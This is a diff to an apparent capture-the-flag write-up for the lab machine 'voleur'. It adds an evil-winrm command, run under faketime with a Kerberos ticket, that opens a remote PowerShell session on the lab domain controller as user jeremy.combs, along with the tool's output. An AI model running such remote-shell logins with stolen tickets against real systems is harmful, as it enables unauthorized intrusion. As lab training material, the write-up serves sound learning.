@@ -467,7 +467,19 @@ Ive generate a TGT and exported it so now i can get access via WINRM as this use
 
 # Evil-winrm as `jeremy.combs`
 ```python
-
+faketime -f +8h evil-winrm -i dc.voleur.htb -r voleur.htb
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\jeremy.combs\Documents>
 ```
+I now have access as `jeremy.combs`
+
+
 
 
